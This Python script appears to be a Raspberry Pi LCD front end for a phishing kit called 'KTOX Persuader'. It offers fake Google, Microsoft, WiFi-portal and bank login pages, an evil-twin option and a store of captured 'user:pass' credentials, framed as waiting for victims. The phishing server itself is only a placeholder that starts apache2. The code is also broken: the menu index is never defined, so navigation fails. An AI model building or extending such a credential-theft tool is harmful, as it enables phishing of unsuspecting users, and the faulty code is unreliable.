#!/usr/bin/env python3
"""
KTOX Persuader - Social Engineering Toolkit
===========================================
Fake login portals + live credential capture on tiny LCD
Dark red ghost style
"""

import os
import time
import subprocess
import threading
import random

try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not detected")

# ── Constants ────────────────────────────────────────────────────────────────
W, H = 128, 128
PINS = {"UP":6, "DOWN":19, "LEFT":5, "RIGHT":26, "OK":13, "KEY1":21, "KEY2":20, "KEY3":16}

VISIBLE_LINES = 7

MENU = [
    "1. Fake Google Login",
    "2. Fake Microsoft Login",
    "3. Fake WiFi Portal",
    "4. Bank Login Phish",
    "5. Custom Message Phish",
    "6. Start Evil Twin",
    "7. View Captured Creds",
    "8. Exit"
]

# ── Globals ──────────────────────────────────────────────────────────────────
LCD = None
_image = None
_draw = None
_font_sm = None

RUNNING = True
phish_running = False
captured = []   # list of "user:pass" strings

def init_hw():
    global LCD, _image, _draw, _font_sm
    if not HAS_HW:
        return False
    try:
        GPIO.setmode(GPIO.BCM)
        for p in PINS.values():
            GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

        LCD = LCD_1in44.LCD()
        LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        LCD.LCD_Clear()

        _image = Image.new("RGB", (W, H), "black")
        _draw = ImageDraw.Draw(_image)
        try:
            _font_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
        except:
            _font_sm = ImageFont.load_default()
        return True
    except:
        return False

def push():
    if LCD and _image:
        LCD.LCD_ShowImage(_image, 0, 0)

# ── Dark Red UI ──────────────────────────────────────────────────────────────
def draw_menu():
    _draw.rectangle((0,0,W,H), fill="#0A0000")
    _draw.rectangle((0,0,W,17), fill="#8B0000")
    _draw.text((4,3), "KTOX PERSUADER", font=_font_sm, fill="#FF3333")

    start = 0   # simple scroll for now
    for i in range(VISIBLE_LINES):
        idx = (start + i) % len(MENU)
        color = "#FF5555" if idx == _menu_idx else "#FFAAAA"
        _draw.text((5, 20 + i*11), MENU[idx][:22], font=_font_sm, fill=color)

    _draw.rectangle((0, H-12, W, H), fill="#220000")
    _draw.text((4, H-11), "UP/DN  K1=launch", font=_font_sm, fill="#FF7777")
    push()

def draw_phish_screen(lines, title="PERSUADER"):
    _draw.rectangle((0,0,W,H), fill="#0A0000")
    _draw.rectangle((0,0,W,17), fill="#8B0000")
    _draw.text((4,3), title, font=_font_sm, fill="#FF3333")

    y = 22
    for line in lines[:8]:
        color = "#FF5555" if ":" in line else "#FFBBBB"
        _draw.text((4, y), line[:20], font=_font_sm, fill=color)
        y += 12

    if phish_running:
        ghost = "👻" * ((int(time.time()) % 3) + 1)
        _draw.text((5, 105), ghost + " Capturing...", font=_font_sm, fill="#FFAA00")

    _draw.rectangle((0,117,W,128), fill="#220000")
    _draw.text((4,118), "K1=Stop  K3=Back", font=_font_sm, fill="#FF7777")
    push()

# ── Simple Web Server for Phishing (background thread) ───────────────────────
def phish_server(template):
    global phish_running
    try:
        # Very basic PHP/HTML fake login page (you can expand templates)
        os.system("sudo systemctl start apache2")
        # Placeholder — in real use, copy a fake login HTML to /var/www/html
        print(f"[+] Serving {template} phishing page")
        phish_running = True
        while phish_running:
            time.sleep(1)
    except:
        pass

def capture_cred(user, password):
    cred = f"{user}:{password}"
    if cred not in captured:
        captured.append(cred)
        if len(captured) > 12:
            captured.pop(0)

# ── Tool Functions ───────────────────────────────────────────────────────────
def launch_phish(template_name):
    global phish_running
    draw_phish_screen(["Starting phishing portal...", template_name])
    threading.Thread(target=phish_server, args=(template_name,), daemon=True).start()
    time.sleep(2)
    draw_phish_screen(["Portal live", "Wait for victims..."], template_name)

def view_captured():
    if not captured:
        return ["No credentials yet"]
    return captured[-8:]

# ── Main Loop ────────────────────────────────────────────────────────────────
def main():
    global RUNNING
    hw_ok = init_hw()
    draw_menu()

    held = {}
    while RUNNING:
        pressed = {name: GPIO.input(pin) == 0 for name, pin in PINS.items()}
        now = time.time()
        for n, down in pressed.items():
            if down and n not in held:
                held[n] = now
            elif not down:
                held.pop(n, None)

        def just_pressed(n):
            return pressed.get(n) and (now - held.get(n, 0)) < 0.2

        if just_pressed("KEY3"):
            break

        if just_pressed("KEY1"):
            item = MENU[_menu_idx % len(MENU)]
            if "Exit" in item:
                break

            draw_phish_screen(["Launching..."], item)

            if "Google" in item or "Microsoft" in item or "Bank" in item or "WiFi" in item:
                launch_phish(item)
            elif "Custom" in item:
                msg = "Custom phishing started"
                draw_phish_screen([msg], "CUSTOM")
            elif "Captured Creds" in item:
                lines = view_captured()
                draw_phish_screen(lines, "CAPTURED")
                time.sleep(6)
            else:
                draw_phish_screen(["Template coming soon"], item)

            time.sleep(4)
            draw_menu()

        # Simple UP/DOWN navigation
        if just_pressed("UP"):
            _menu_idx = (_menu_idx - 1) % len(MENU)
            draw_menu()
            time.sleep(0.15)

        if just_pressed("DOWN"):
            _menu_idx = (_menu_idx + 1) % len(MENU)
            draw_menu()
            time.sleep(0.15)

        time.sleep(0.05)

    RUNNING = False
    if HAS_HW:
        try:
            LCD.LCD_Clear()
            GPIO.cleanup()
        except:
            pass
    print("KTOX Persuader exited.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    finally:
        if HAS_HW:
            try:
                GPIO.cleanup()
            except:
                pass